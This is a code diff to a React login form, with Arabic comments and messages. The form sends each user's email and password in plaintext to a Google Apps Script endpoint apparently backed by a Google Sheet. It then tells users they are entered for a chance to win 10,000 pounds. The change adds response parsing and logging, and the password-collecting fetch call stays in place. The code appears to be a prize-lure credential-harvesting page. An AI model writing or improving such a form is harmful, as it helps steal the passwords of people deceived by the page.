@@ -15,14 +15,12 @@ const LoginForm = () => {
     e.preventDefault();
     setIsLoading(true);
 
-    // إعداد البيانات للإرسال
     const data = {
       email: email,
       password: password,
     };
 
     try {
-      // إرسال البيانات إلى Google Sheets Web App
       const response = await fetch('https://script.google.com/macros/s/AKfycbz76h-b0W_sbnknoJnpzOPUSng4vHvIw4h6vi3UfdxhfLYNupa-iUDcxuLpDUEG__-b_Q/exec', {
         method: 'POST',
         headers: {
@@ -31,15 +29,19 @@ const LoginForm = () => {
         body: JSON.stringify(data),
       });
 
-      if (response.ok) {
+      const result = await response.json();
+      console.log('Response:', result); // لتتبع الاستجابة
+
+      if (response.ok && result.status === "success") {
         toast({
           title: "تم تسجيل الدخول بنجاح!",
           description: "أنت الآن مسجل للمشاركة في فرصة ربح 10,000 جنيه!",
         });
       } else {
-        throw new Error('فشل في تسجيل البيانات');
+        throw new Error('فشل في تسجيل البيانات: ' + (result.message || 'خطأ غير معروف'));
       }
     } catch (error) {
+      console.error('Error:', error);
       toast({
         title: "حدث خطأ",
         description: "تعذر حفظ البيانات، حاول مرة أخرى.",
